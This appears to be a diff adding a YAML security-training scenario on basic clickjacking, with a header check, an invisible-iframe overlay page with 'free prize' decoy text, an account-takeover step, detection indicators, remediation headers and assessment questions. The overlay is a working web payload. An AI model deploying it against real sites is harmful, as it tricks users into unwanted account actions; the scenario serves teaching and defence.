@@ -1,0 +1,98 @@
+# Category: Clickjacking
+name: "Basic clickjacking with CSRF token protection"
+id: "clickjacking-basic-csrf-001"
+category: "clickjacking"
+subcategory: "basic"
+difficulty: "apprentice"
+estimated_time: "30 minutes"
+
+description: |
+  This scenario covers basic clickjacking where the target application has
+  CSRF token protection but lacks X-Frame-Options or Content-Security-Policy
+  frame-ancestors. The attacker can use an invisible iframe to overlay the
+  target's sensitive action (e.g., email change, delete account) and trick
+  the user into clicking it while they think they are clicking something else.
+
+learning_objectives:
+  - Understand clickjacking and UI redress attacks
+  - Identify if a site can be framed (no X-Frame-Options)
+  - Create an iframe overlay that tricks the user into clicking
+  - Bypass CSRF tokens by using the victim's session
+
+tools:
+  - Burp Suite
+  - Basic HTML/CSS
+
+prerequisites:
+  - Target application has no X-Frame-Options header
+  - State-changing action requires CSRF token (available in the page)
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Check if the site allows framing"
+    commands:
+      - "# Check response headers for X-Frame-Options or CSP frame-ancestors"
+      - "curl -I https://target.com"
+      - "# If absent, the site is vulnerable"
+    expected_output: "No framing protection headers found"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Create a clickjacking page"
+    commands:
+      - "# HTML with iframe overlay:"
+      - "<html><body style='margin:0;overflow:hidden'>"
+      - "<iframe src='https://target.com/account' style='position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.0001;z-index:100'></iframe>"
+      - "<div style='position:fixed;top:200px;left:100px;z-index:1;font-size:24px'>Click here for free prize</div>"
+      - "</body></html>"
+    expected_output: "When victim clicks the decoy button, they unknowingly click the target's action"
+    detection: "Application logs show the action from the victim's session"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Escalate to account takeover"
+    commands:
+      - "# Use the technique for password reset or admin actions"
+    expected_output: "Victim's account compromised"
+    detection: "Security alerts for account changes"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1204"
+    description: "User Execution"
+  - standard: "OWASP"
+    control: "A04:2021"
+    description: "Insecure Design"
+
+detection:
+  network_indicators:
+    - "Requests with unusual Referer header"
+  log_indicators:
+    - "State-changing actions from new IPs"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Set X-Frame-Options: DENY or SAMEORIGIN"
+    - "Use Content-Security-Policy: frame-ancestors"
+  long_term:
+    - "Implement frame-busting JavaScript (though less reliable)"
+    - "Use anti-clickjacking libraries"
+
+variables:
+  target_url: "https://target.com/account"
+  decoy_text: "Click here for free prize"
+
+assessment_questions:
+  - "What is clickjacking and how does it differ from XSS?"
+  - "How does X-Frame-Options prevent clickjacking?"
+  - "Why might CSRF tokens not protect against clickjacking?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/Clickjacking"
+    title: "OWASP Clickjacking"
+  - url: "https://portswigger.net/web-security/clickjacking"
+    title: "PortSwigger Clickjacking"
